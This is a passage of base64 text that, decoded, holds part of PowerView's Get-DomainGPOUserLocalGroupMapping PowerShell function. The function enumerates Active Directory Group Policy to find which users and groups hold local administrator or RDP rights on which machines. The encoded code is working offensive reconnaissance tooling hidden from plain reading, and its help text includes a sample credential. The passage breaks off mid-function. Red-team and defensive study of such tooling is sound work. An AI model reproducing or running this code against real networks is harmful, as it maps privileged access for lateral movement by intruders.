iB1c2VyL2dyb3VwIGlzIGEgbWVtYmVyIG9mIGEgc3BlY2lmaWMKbG9jYWwgZ3JvdXAsIGFsbCB0aHJvdWdoIEdQTyBjb3JyZWxhdGlvbi4gSWYgbm8gdXNlci9ncm91cCBpcyBzcGVjaWZpZWQsIGFsbApkaXNjb3ZlcmFibGUgbWFwcGluZ3MgYXJlIHJldHVybmVkLgoKQXV0aG9yOiBAaGFybWoweSAgCkxpY2Vuc2U6IEJTRCAzLUNsYXVzZSAgClJlcXVpcmVkIERlcGVuZGVuY2llczogR2V0LURvbWFpbkdQT0xvY2FsR3JvdXAsIEdldC1Eb21haW5PYmplY3QsIEdldC1Eb21haW5Db21wdXRlciwgR2V0LURvbWFpbk9VLCBHZXQtRG9tYWluU2l0ZSwgR2V0LURvbWFpbkdyb3VwICAKCi5ERVNDUklQVElPTgoKVGFrZXMgYSB1c2VyL2dyb3VwIG5hbWUgYW5kIG9wdGlvbmFsIGRvbWFpbiwgYW5kIGRldGVybWluZXMgdGhlIGNvbXB1dGVycyBpbiB0aGUgZG9tYWluCnRoZSB1c2VyL2dyb3VwIGhhcyBsb2NhbCBhZG1pbiAob3IgUkRQKSByaWdodHMgdG8uCgpJdCBkb2VzIHRoaXMgYnk6CiAgICAxLiAgcmVzb2x2aW5nIHRoZSB1c2VyL2dyb3VwIHRvIGl0cyBwcm9wZXIgU0lECiAgICAyLiAgZW51bWVyYXRpbmcgYWxsIGdyb3VwcyB0aGUgdXNlci9ncm91cCBpcyBhIGN1cnJlbnQgcGFydCBvZgogICAgICAgIGFuZCBleHRyYWN0aW5nIGFsbCB0YXJnZXQgU0lEcyB0byBidWlsZCBhIHRhcmdldCBTSUQgbGlzdAogICAgMy4gIHB1bGxpbmcgYWxsIEdQT3MgdGhhdCBzZXQgJ1Jlc3RyaWN0ZWQgR3JvdXBzJyBvciBHcm91cHMueG1sIGJ5IGNhbGxpbmcKICAgICAgICBHZXQtRG9tYWluR1BPTG9jYWxHcm91cAogICAgNC4gIG1hdGNoaW5nIHRoZSB0YXJnZXQgU0lEIGxpc3QgdG8gdGhlIHF1ZXJpZWQgR1BPIFNJRCBsaXN0CiAgICAgICAgdG8gZW51bWVyYXRlIGFsbCBHUE8gdGhlIHVzZXIgaXMgZWZmZWN0aXZlbHkgYXBwbGllZCB3aXRoCiAgICA1LiAgZW51bWVyYXRpbmcgYWxsIE9VcyBhbmQgc2l0ZXMgYW5kIGFwcGxpY2FibGUgR1BPIEdVSXMgYXJlCiAgICAgICAgYXBwbGllZCB0byB0aHJvdWdoIGdwbGluayBlbnVtZXJhdGluZwogICAgNi4gIHF1ZXJ5aW5nIGZvciBhbGwgY29tcHV0ZXJzIHVuZGVyIHRoZSBnaXZlbiBPVXMgb3Igc2l0ZXMKCklmIG5vIHVzZXIvZ3JvdXAgaXMgc3BlY2lmaWVkLCBhbGwgdXNlci9ncm91cCAtPiBtYWNoaW5lIG1hcHBpbmdzIGRpc2NvdmVyZWQgdGhyb3VnaApHUE8gcmVsYXRpb25zaGlwcyBhcmUgcmV0dXJuZWQuCgouUEFSQU1FVEVSIElkZW50aXR5CgpBIFNhbUFjY291bnROYW1lIChlLmcuIGhhcm1qMHkpLCBEaXN0aW5ndWlzaGVkTmFtZSAoZS5nLiBDTj1oYXJtajB5LENOPVVzZXJzLERDPXRlc3RsYWIsREM9bG9jYWwpLApTSUQgKGUuZy4gUy0xLTUtMjEtODkwMTcxODU5LTM0MzM4MDkyNzktMzM2NjE5Njc1My0xMTA4KSwgb3IgR1VJRCAoZS5nLiA0YzQzNWRkNy1kYzU4LTRiMTQtOWE1ZS0xZmRiMGU4MGQyMDEpCmZvciB0aGUgdXNlci9ncm91cCB0byBpZGVudGl0eSBHUE8gbG9jYWwgZ3JvdXAgbWFwcGluZ3MgZm9yLgoKLlBBUkFNRVRFUiBMb2NhbEdyb3VwCgpUaGUgbG9jYWwgZ3JvdXAgdG8gY2hlY2sgYWNjZXNzIGFnYWluc3QuCkNhbiBiZSAiQWRtaW5pc3RyYXRvcnMiIChTLTEtNS0zMi01NDQpLCAiUkRQL1JlbW90ZSBEZXNrdG9wIFVzZXJzIiAoUy0xLTUtMzItNTU1KSwKb3IgYSBjdXN0b20gbG9jYWwgU0lELiBEZWZhdWx0cyB0byBsb2NhbCAnQWRtaW5pc3RyYXRvcnMnLgoKLlBBUkFNRVRFUiBEb21haW4KClNwZWNpZmllcyB0aGUgZG9tYWluIHRvIGVudW1lcmF0ZSBHUE9zIGZvciwgZGVmYXVsdHMgdG8gdGhlIGN1cnJlbnQgZG9tYWluLgoKLlBBUkFNRVRFUiBTZXJ2ZXIKClNwZWNpZmllcyBhbiBBY3RpdmUgRGlyZWN0b3J5IHNlcnZlciAoZG9tYWluIGNvbnRyb2xsZXIpIHRvIGJpbmQgdG8uCgouUEFSQU1FVEVSIFNlYXJjaFNjb3BlCgpTcGVjaWZpZXMgdGhlIHNjb3BlIHRvIHNlYXJjaCB1bmRlciwgQmFzZS9PbmVMZXZlbC9TdWJ0cmVlIChkZWZhdWx0IG9mIFN1YnRyZWUpLgoKLlBBUkFNRVRFUiBSZXN1bHRQYWdlU2l6ZQoKU3BlY2lmaWVzIHRoZSBQYWdlU2l6ZSB0byBzZXQgZm9yIHRoZSBMREFQIHNlYXJjaGVyIG9iamVjdC4KCi5QQVJBTUVURVIgU2VydmVyVGltZUxpbWl0CgpTcGVjaWZpZXMgdGhlIG1heGltdW0gYW1vdW50IG9mIHRpbWUgdGhlIHNlcnZlciBzcGVuZHMgc2VhcmNoaW5nLiBEZWZhdWx0IG9mIDEyMCBzZWNvbmRzLgoKLlBBUkFNRVRFUiBUb21ic3RvbmUKClN3aXRjaC4gU3BlY2lmaWVzIHRoYXQgdGhlIHNlYXJjaGVyIHNob3VsZCBhbHNvIHJldHVybiBkZWxldGVkL3RvbWJzdG9uZWQgb2JqZWN0cy4KCi5QQVJBTUVURVIgQ3JlZGVudGlhbAoKQSBbTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbF0gb2JqZWN0IG9mIGFsdGVybmF0ZSBjcmVkZW50aWFscwpmb3IgY29ubmVjdGlvbiB0byB0aGUgdGFyZ2V0IGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLUdQT0xvY2F0aW9uCgpGaW5kIGFsbCB1c2VyL2dyb3VwIC0+IG1hY2hpbmUgcmVsYXRpb25zaGlwcyB3aGVyZSB0aGUgdXNlci9ncm91cCBpcyBhIG1lbWJlcgpvZiB0aGUgbG9jYWwgYWRtaW5pc3RyYXRvcnMgZ3JvdXAgb24gdGFyZ2V0IG1hY2hpbmVzLgoKLkVYQU1QTEUKCkZpbmQtR1BPTG9jYXRpb24gLVVzZXJOYW1lIGRmbSAtRG9tYWluIGRldi50ZXN0bGFiLmxvY2FsCgpGaW5kIGFsbCBjb21wdXRlcnMgdGhhdCBkZm0gdXNlciBoYXMgbG9jYWwgYWRtaW5pc3RyYXRvciByaWdodHMgdG8gaW4KdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLUdQT0xvY2F0aW9uIC1Vc2VyTmFtZSBkZm0gLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKRmluZCBhbGwgY29tcHV0ZXJzIHRoYXQgZGZtIHVzZXIgaGFzIGxvY2FsIGFkbWluaXN0cmF0b3IgcmlnaHRzIHRvIGluCnRoZSBkZXYudGVzdGxhYi5sb2NhbCBkb21haW4uCgouRVhBTVBMRQoKJFNlY1Bhc3N3b3JkID0gQ29udmVydFRvLVNlY3VyZVN0cmluZyAnUGFzc3dvcmQxMjMhJyAtQXNQbGFpblRleHQgLUZvcmNlCiRDcmVkID0gTmV3LU9iamVjdCBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlBTQ3JlZGVudGlhbCgnVEVTVExBQlxkZm0uYScsICRTZWNQYXNzd29yZCkKR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZyAtQ3JlZGVudGlhbCAkQ3JlZAoKLk9VVFBVVFMKClBvd2VyVmlldy5HUE9Mb2NhbEdyb3VwTWFwcGluZwoKQSBjdXN0b20gUFNPYmplY3QgY29udGFpbmluZyBhbnkgdGFyZ2V0IGlkZW50aXR5IGluZm9ybWF0aW9uIGFuZCB3aGF0IGxvY2FsCmdyb3VwIG1lbWJlcnNoaXBzIHRoZXkncmUgYSBwYXJ0IG9mIHRocm91Z2ggR1BPIGNvcnJlbGF0aW9uLgoKLkxJTksKCmh0dHA6Ly93d3cuaGFybWoweS5uZXQvYmxvZy9yZWR0ZWFtaW5nL3doZXJlLW15LWFkbWlucy1hdC1ncG8tZWRpdGlvbi8KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmcnKV0KICAgIFtDbWRsZXRCaW5kaW5nKCldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0Rpc3Rpbmd1aXNoZWROYW1lJywgJ1NhbUFjY291bnROYW1lJywgJ05hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRJZGVudGl0eSwKCiAgICAgICAgW1N0cmluZ10KICAgICAgICBbVmFsaWRhdGVTZXQoJ0FkbWluaXN0cmF0b3JzJywgJ1MtMS01LTMyLTU0NCcsICdSRFAnLCAnUmVtb3RlIERlc2t0b3AgVXNlcnMnLCAnUy0xLTUtMzItNTU1JyldCiAgICAgICAgJExvY2FsR3JvdXAgPSAnQWRtaW5pc3RyYXRvcnMnLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJERvbWFpbiwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ0FEU1BhdGgnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hCYXNlLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eQogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQ29tbW9uQXJndW1lbnRzID0gQHt9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snRG9tYWluJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snRG9tYWluJ10gPSAkRG9tYWluIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXInXSkgeyAkQ29tbW9uQXJndW1lbnRzWydTZXJ2ZXInXSA9ICRTZXJ2ZXIgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1NlYXJjaFNjb3BlJ10pIHsgJENvbW1vbkFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydSZXN1bHRQYWdlU2l6ZSddID0gJFJlc3VsdFBhZ2VTaXplIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydTZXJ2ZXJUaW1lTGltaXQnXSkgeyAkQ29tbW9uQXJndW1lbnRzWydTZXJ2ZXJUaW1lTGltaXQnXSA9ICRTZXJ2ZXJUaW1lTGltaXQgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ1RvbWJzdG9uZSddKSB7ICRDb21tb25Bcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21tb25Bcmd1bWVudHNbJ0NyZWRlbnRpYWwnXSA9ICRDcmVkZW50aWFsIH0KICAgIH0KCiAgICBQUk9DRVNTIHsKICAgICAgICAkVGFyZ2V0U0lEcyA9IEAoKQoKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydJZGVudGl0eSddKSB7CiAgICAgICAgICAgICRUYXJnZXRTSURzICs9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJElkZW50aXR5IHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kIG9iamVjdHNpZAogICAgICAgICAgICAkVGFyZ2V0T2JqZWN0U0lEID0gJFRhcmdldFNJRHMKICAgICAgICAgICAgaWYgKC1ub3QgJFRhcmdldFNJRHMpIHsKICAgICAgICAgICAgICAgIFRocm93ICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gVW5hYmxlIHRvIHJldHJpZXZlIFNJRCBmb3IgaWRlbnRpdHkgJyRJZGVudGl0eSciCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgbm8gZmlsdGVyaW5nL21hdGNoIGFsbAogICAgICAgICAgICAkVGFyZ2V0U0lEcyA9IEAoJyonKQogICAgICAgIH0KCiAgICAgICAgaWYgKCRMb2NhbEdyb3VwIC1tYXRjaCAnUy0xLTUnKSB7CiAgICAgICAgICAgICRUYXJnZXRMb2NhbFNJRCA9ICRMb2NhbEdyb3VwCiAgICAgICAgfQogICAgICAgIGVsc2VpZiAoJExvY2FsR3JvdXAgLW1hdGNoICdBZG1pbicpIHsKICAgICAgICAgICAgJFRhcmdldExvY2FsU0lEID0gJ1MtMS01LTMyLTU0NCcKICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICMgUkRQCiAgICAgICAgICAgICRUYXJnZXRMb2NhbFNJRCA9ICdTLTEtNS0zMi01NTUnCiAgICAgICAgfQoKICAgICAgICBpZiAoJFRhcmdldFNJRHNbMF0gLW5lICcqJykgewogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0U2lkIGluICRUYXJnZXRTaWRzKSB7CiAgICAgICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbR2V0LURvbWFpbkdQT1VzZXJMb2NhbEdyb3VwTWFwcGluZ10gRW51bWVyYXRpbmcgbmVzdGVkIGdyb3VwIG1lbWJlcnNoaXBzIGZvcjogJyRUYXJnZXRTaWQnIgogICAgICAgICAgICAgICAgJFRhcmdldFNJRHMgKz0gR2V0LURvbWFpbkdyb3VwIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ29iamVjdHNpZCcgLU1lbWJlcklkZW50aXR5ICRUYXJnZXRTaWQgfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBvYmplY3RzaWQKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0dldC1Eb21haW5HUE9Vc2VyTG9jYWxHcm91cE1hcHBpbmddIFRhcmdldCBsb2NhbGdyb3VwIFNJRDogJFRhcmdldExvY2FsU0lEIgogICAgICAgIFdyaXRlLVZlcmJvc2UgIltHZXQtRG9tYWluR1BPVXNlckxvY2FsR3JvdXBNYXBwaW5nXSBFZmZlY3RpdmUgdGFyZ2V0IGRvbWFpbiBTSURzOiAkVGFyZ2V0U0lEcyIKCiAgICAgICAgJEdQT2dyb3VwcyA9IEdldC1Eb21haW5HUE9Mb2NhbEdyb3VwIEBDb21tb25Bcmd1bWVudHMgLVJlc29sdmVNZW1iZXJzVG9TSURzIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAkR1BPZ3JvdXAgPSAkXwogICAgICAgICAgICAjIGlmIHRoZSBsb2NhbGx5IHNldCBncm91cCBpcyB3aGF0IHdlJ3JlIGxvb2tpbmcgZm9yLCBjaGVjayB0aGUgR3JvdXBNZW1iZXJzICgnbWVtYmVycycpIGZvciBvdXIgdGFyZ2V0IFNJRAogICAgICAgICAgICBpZiAoJEdQT2dyb3VwLkdyb3VwU0lEIC1tYXRjaCAkVGFyZ2V0TG9jYWxTSUQpIHsKICAgICAgICAgICAgICAgICRHUE9ncm91cC5Hcm91cE1lbWJlcnMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgICAgICBpZiAoICgkVGFyZ2V0U0lEc1swXSAtZXEgJyonKSAtb3IgKCRUYXJnZXRTSURzIC1Db250YWlucyAkXykgKSB7CiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9ncm91cAogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgICAgICAjIGlmIHRoZSBncm91cCBpcyBhICdtZW1iZXJvZicgdGhlIGdyb3VwIHdlJ3JlIGxvb2tpbmcgZm9yLCBjaGVjayBHcm91cFNJRCBhZ2FpbnN0IHRoZSB0YXJndCBTSURzCiAgICAgICAgICAgIGlmICggKCRHUE9ncm91cC5Hcm91cE1lbWJlck9mIC1jb250YWlucyAkVGFyZ2V0TG9jYWxTSUQpICkgewogICAgICAgICAgICAgICAgaWYgKCAoJFRhcmdldFNJRHNbMF0gLWVxICcqJykgLW9yICgkVGFyZ2V0U0lEcyAtQ29udGFpbnMgJEdQT2dyb3VwLkdyb3VwU0lEKSApIHsKICAgICAgICAgICAgICAgICAgICAkR1BPZ3JvdXAKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0gfCBTb3J0LU9iamVjdCAtUHJvcGVydHkgR1BPTmFtZSAtVW5pcXVlCgogICAgICAgICRHUE9ncm91cHMgfCBXaGVyZS1PYmplY3QgeyRffSB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgJEdQT25hbWUgPSAkXy5HUE9EaXNwbGF5TmFtZQogICAgICAgICAgICAkR1BPZ3VpZCA9ICRfLkdQT05hbWUKICAgICAgICAgICAgJEdQT1BhdGggPSAkXy5HUE9QYXRoCiAgICAgICAgICAgICRHUE9UeXBlID0gJF8uR1BPVHlwZQogICAgICAgICAgICBpZiAoJF8uR3JvdXBNZW1iZXJzKSB7CiAgICAgICAgICAgICAgICAkR1BPTWVtYmVycyA9ICRfLkdyb3VwTWVtYmVycwogICAgICAgICAgICB9CiAgICAgICAgICAgIGVsc2UgewogICAgICAgICAgICAgICAgJEdQT01lbWJlcnMgPSAkXy5Hcm91cFNJRAogICAgICAgICAgICB9CgogICAgICAgICAgICAkRmlsdGVycyA9ICRfLkZpbHRlcnMKCiAgICAgICAgICAgIGlmICgkVGFyZ2V0U0lEc1swXSAtZXEgJyonKSB7CiAgICAgICAgICAgICAgICAjIGlmIHRoZSAqIHdpbGRjYXJkIHdhcyB1c2VkLCBzZXQgdGhlIHRhcmdldHMgdG8gYWxsIEdQTyBtZW1iZXJzIHNvIGV2ZXJ5dGhpbmcgaXQgb3V0cHV0CiAgICAgICAgICAgICAgICAkVGFyZ2V0T2JqZWN0U0lEcyA9ICRHUE9NZW1iZXJzCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAkVGFyZ2V0T2JqZWN0U0lEcyA9ICRUYXJnZXRPYmplY3RTSUQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBmaW5kIGFueSBPVXMgdGhhdCBoYXZlIHRoaXMgR1BPIGxpbmtlZCB0aHJvdWdoIGdwTGluawogICAgICAgICAgICBHZXQtRG9tYWluT1UgQENvbW1vbkFyZ3VtZW50cyAtUmF3IC1Qcm9wZXJ0aWVzICduYW1lLGRpc3Rpbmd1aXNoZWRuYW1lJyAtR1BMaW5rICRHUE9HdWlkIHwgRm9yRWFjaC1PYmplY3QgewogICAgICAgICAgICAgICAgaWYgKCRGaWx0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgJE9VQ29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ2Ruc2hvc3RuYW1lLGRpc3Rpbmd1aXNoZWRuYW1lJyAtU2VhcmNoQmFzZSAkXy5QYXRoIHwgV2hlcmUtT2JqZWN0IHskXy5kaXN0aW5ndWlzaGVkbmFtZSAtbWF0Y2ggKCRGaWx0ZXJzLlZhbHVlKX0gfCBTZWxlY3QtT2JqZWN0IC1FeHBhbmRQcm9wZXJ0eSBkbnNob3N0bmFtZQogICAgICAgICAgICAgICAgfQogICAgICAgICAgICAgICAgZWxzZSB7CiAgICAgICAgICAgICAgICAgICAgJE9VQ29tcHV0ZXJzID0gR2V0LURvbWFpbkNvbXB1dGVyIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ2Ruc2hvc3RuYW1lJyAtU2VhcmNoQmFzZSAkXy5QYXRoIHwgU2VsZWN0LU9iamVjdCAtRXhwYW5kUHJvcGVydHkgZG5zaG9zdG5hbWUKICAgICAgICAgICAgICAgIH0KCiAgICAgICAgICAgICAgICBpZiAoJE9VQ29tcHV0ZXJzKSB7CiAgICAgICAgICAgICAgICAgICAgaWYgKCRPVUNvbXB1dGVycyAtaXNub3QgW1N5c3RlbS5BcnJheV0pIHskT1VDb21wdXRlcnMgPSBAKCRPVUNvbXB1dGVycyl9CgogICAgICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJFRhcmdldE9iamVjdFNJRHMpIHsKICAgICAgICAgICAgICAgICAgICAgICAgJE9iamVjdCA9IEdldC1Eb21haW5PYmplY3QgQENvbW1vbkFyZ3VtZW50cyAtSWRlbnRpdHkgJFRhcmdldFNpZCAtUHJvcGVydGllcyAnc2FtYWNjb3VudHR5cGUsc2FtYWNjb3VudG5hbWUsZGlzdGluZ3Vpc2hlZG5hbWUsb2JqZWN0c2lkJwoKICAgICAgICAgICAgICAgICAgICAgICAgJElzR3JvdXAgPSBAKCcyNjg0MzU0NTYnLCcyNjg0MzU0NTcnLCc1MzY4NzA5MTInLCc1MzY4NzA5MTMnKSAtY29udGFpbnMgJE9iamVjdC5zYW1hY2NvdW50dHlwZQoKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0TmFtZScgJE9iamVjdC5zYW1hY2NvdW50bmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnT2JqZWN0RE4nICRPYmplY3QuZGlzdGluZ3Vpc2hlZG5hbWUKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdC5vYmplY3RzaWQKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0RvbWFpbicgJERvbWFpbgogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT0Rpc3BsYXlOYW1lJyAkR1BPbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnR1BPR3VpZCcgJEdQT0d1aWQKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ0dQT1BhdGgnICRHUE9QYXRoCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdHUE9UeXBlJyAkR1BPVHlwZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29udGFpbmVyTmFtZScgJF8uUHJvcGVydGllcy5kaXN0aW5ndWlzaGVkbmFtZQogICAgICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnQ29tcHV0ZXJOYW1lJyAkT1VDb21wdXRlcnMKICAgICAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nLlBTT2JqZWN0LlR5cGVOYW1lcy5JbnNlcnQoMCwgJ1Bvd2VyVmlldy5HUE9Mb2NhbEdyb3VwTWFwcGluZycpCiAgICAgICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZwogICAgICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQoKICAgICAgICAgICAgIyBmaW5kIGFueSBzaXRlcyB0aGF0IGhhdmUgdGhpcyBHUE8gbGlua2VkIHRocm91Z2ggZ3BMaW5rCiAgICAgICAgICAgIEdldC1Eb21haW5TaXRlIEBDb21tb25Bcmd1bWVudHMgLVByb3BlcnRpZXMgJ3NpdGVvYmplY3RibCxkaXN0aW5ndWlzaGVkbmFtZScgLUdQTGluayAkR1BPR3VpZCB8IEZvckVhY2gtT2JqZWN0IHsKICAgICAgICAgICAgICAgIEZvckVhY2ggKCRUYXJnZXRTaWQgaW4gJFRhcmdldE9iamVjdFNJRHMpIHsKICAgICAgICAgICAgICAgICAgICAkT2JqZWN0ID0gR2V0LURvbWFpbk9iamVjdCBAQ29tbW9uQXJndW1lbnRzIC1JZGVudGl0eSAkVGFyZ2V0U2lkIC1Qcm9wZXJ0aWVzICdzYW1hY2NvdW50dHlwZSxzYW1hY2NvdW50bmFtZSxkaXN0aW5ndWlzaGVkbmFtZSxvYmplY3RzaWQnCgogICAgICAgICAgICAgICAgICAgICRJc0dyb3VwID0gQCgnMjY4NDM1NDU2JywnMjY4NDM1NDU3JywnNTM2ODcwOTEyJywnNTM2ODcwOTEzJykgLWNvbnRhaW5zICRPYmplY3Quc2FtYWNjb3VudHR5cGUKCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nID0gTmV3LU9iamVjdCBQU09iamVjdAogICAgICAgICAgICAgICAgICAgICRHUE9Mb2NhbEdyb3VwTWFwcGluZyB8IEFkZC1NZW1iZXIgTm90ZXByb3BlcnR5ICdPYmplY3ROYW1lJyAkT2JqZWN0LnNhbWFjY291bnRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdEROJyAkT2JqZWN0LmRpc3Rpbmd1aXNoZWRuYW1lCiAgICAgICAgICAgICAgICAgICAgJEdQT0xvY2FsR3JvdXBNYXBwaW5nIHwgQWRkLU1lbWJlciBOb3RlcHJvcGVydHkgJ09iamVjdFNJRCcgJE9iamVjdC5vYmplY3RzaWQKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnSXNHcm91cCcgJElzR3JvdXAKICAgICAgICAgICAgICAgICAgICAkR1BPTG9jYWxHcm91cE1hcHBpbmcgfCBBZGQtTWVtYmVyIE5vdGVwcm9wZXJ0eSAnRG9tYWluJyAkRG9tYWluCiAgICAg